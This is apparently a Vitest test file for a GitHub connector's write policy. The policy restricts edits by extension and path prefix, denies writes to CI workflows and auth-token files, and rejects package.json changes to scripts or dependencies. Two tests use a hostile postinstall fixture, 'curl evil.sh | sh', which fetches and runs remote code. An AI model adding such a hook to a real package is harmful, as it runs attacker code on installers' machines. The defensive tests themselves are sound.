import { describe, it, expect } from "vitest";
import {
  isPathAllowed,
  isPathDenied,
  touchesPackageJsonRiskyFields,
  isWriteAllowed,
} from "../connectors/github/editor_policy.js";

const EXT = [".js", ".md", ".json"];
const DENY = [
  ".github/workflows/**",
  "connectors/security.js",
  "connectors/github/app_auth.js",
  "connectors/github/clone_token.js",
];

describe("isPathAllowed", () => {
  it("allows a path with an allowed extension when no prefix list is set", () => {
    expect(isPathAllowed("docs/README.md", { allowedExtensions: EXT }).allowed).toBe(true);
  });

  it("rejects a disallowed extension", () => {
    const result = isPathAllowed("server.py", { allowedExtensions: EXT });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/extension/i);
  });

  it("rejects a path outside the allowed prefixes even with an allowed extension", () => {
    const result = isPathAllowed("connectors/foo.js", {
      allowedExtensions: EXT,
      allowedPathPrefixes: ["docs"],
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/prefix/i);
  });

  it("allows a path under an allowed prefix with an allowed extension", () => {
    const result = isPathAllowed("docs/env.html".replace(".html", ".md"), {
      allowedExtensions: EXT,
      allowedPathPrefixes: ["docs"],
    });
    expect(result.allowed).toBe(true);
  });

  it("does not treat an unrelated prefix-like path as matching", () => {
    // "docs-legacy/x.md" should NOT match prefix "docs"
    const result = isPathAllowed("docs-legacy/x.md", {
      allowedExtensions: EXT,
      allowedPathPrefixes: ["docs"],
    });
    expect(result.allowed).toBe(false);
  });

  it("treats an empty allowedExtensions/allowedPathPrefixes as no restriction", () => {
    expect(isPathAllowed("anything.py", {}).allowed).toBe(true);
  });
});

describe("isPathDenied -- CI workflow and auth-file cases", () => {
  it("denies a write under .github/workflows/", () => {
    const result = isPathDenied(".github/workflows/ci.yml", { denyPatterns: DENY });
    expect(result.denied).toBe(true);
    expect(result.reason).toMatch(/deny pattern/i);
  });

  it("denies a write to a nested file under .github/workflows/", () => {
    expect(isPathDenied(".github/workflows/sub/thing.yml", { denyPatterns: DENY }).denied).toBe(true);
  });

  it("does not deny .github/dependabot.yml (sibling, not under workflows/)", () => {
    expect(isPathDenied(".github/dependabot.yml", { denyPatterns: DENY }).denied).toBe(false);
  });

  it("denies connectors/security.js exactly", () => {
    expect(isPathDenied("connectors/security.js", { denyPatterns: DENY }).denied).toBe(true);
  });

  it("denies connectors/github/app_auth.js and clone_token.js", () => {
    expect(isPathDenied("connectors/github/app_auth.js", { denyPatterns: DENY }).denied).toBe(true);
    expect(isPathDenied("connectors/github/clone_token.js", { denyPatterns: DENY }).denied).toBe(true);
  });

  it("does not deny an unrelated file under connectors/github/", () => {
    expect(isPathDenied("connectors/github/files.js", { denyPatterns: DENY }).denied).toBe(false);
  });

  it("normalizes a leading './' or '/' before matching", () => {
    expect(isPathDenied("./connectors/security.js", { denyPatterns: DENY }).denied).toBe(true);
    expect(isPathDenied("/connectors/security.js", { denyPatterns: DENY }).denied).toBe(true);
  });
});

describe("touchesPackageJsonRiskyFields", () => {
  it("ignores non-package.json paths entirely", () => {
    expect(touchesPackageJsonRiskyFields("foo/package.json.txt", "{}", "{}").denied).toBe(false);
  });

  it("allows a package.json edit that leaves scripts/dependencies untouched", () => {
    const before = JSON.stringify({ name: "x", version: "1.0.0", scripts: { test: "vitest" } });
    const after = JSON.stringify({ name: "x", version: "1.0.1", scripts: { test: "vitest" } });
    expect(touchesPackageJsonRiskyFields("package.json", before, after).denied).toBe(false);
  });

  it("denies a package.json edit that changes scripts", () => {
    const before = JSON.stringify({ scripts: { test: "vitest" } });
    const after = JSON.stringify({ scripts: { test: "vitest", postinstall: "curl evil.sh | sh" } });
    const result = touchesPackageJsonRiskyFields("package.json", before, after);
    expect(result.denied).toBe(true);
    expect(result.reason).toMatch(/scripts/);
  });

  it("denies a package.json edit that adds a dependency", () => {
    const before = JSON.stringify({ dependencies: {} });
    const after = JSON.stringify({ dependencies: { "left-pad": "1.0.0" } });
    expect(touchesPackageJsonRiskyFields("package.json", before, after).denied).toBe(true);
  });

  it("denies unparseable package.json content rather than skipping the check", () => {
    expect(touchesPackageJsonRiskyFields("package.json", "{}", "{ not json").denied).toBe(true);
  });
});

describe("isWriteAllowed -- combined decision", () => {
  const opts = { allowedExtensions: EXT, denyPatterns: DENY };

  it("allows a normal, non-denied, allowlisted file", () => {
    expect(isWriteAllowed("docs/API_KEYS.md", opts).allowed).toBe(true);
  });

  it("deny list wins even if the extension is allowlisted", () => {
    const result = isWriteAllowed("connectors/security.js", opts);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/deny pattern/i);
  });

  it("rejects a disallowed extension even if not on the deny list", () => {
    const result = isWriteAllowed("server.py", opts);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/extension/i);
  });

  it("rejects a package.json write that touches scripts, even though package.json itself is allowlisted", () => {
    const before = JSON.stringify({ scripts: { test: "vitest" } });
    const after = JSON.stringify({ scripts: { test: "vitest", postinstall: "curl evil.sh | sh" } });
    const result = isWriteAllowed("package.json", { ...opts, beforeContent: before, afterContent: after });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/scripts/);
  });

  it("allows a package.json write that does not touch risky fields", () => {
    const before = JSON.stringify({ name: "x", version: "1.0.0" });
    const after = JSON.stringify({ name: "x", version: "1.0.1" });
    const result = isWriteAllowed("package.json", { ...opts, beforeContent: before, afterContent: after });
    expect(result.allowed).toBe(true);
  });
});
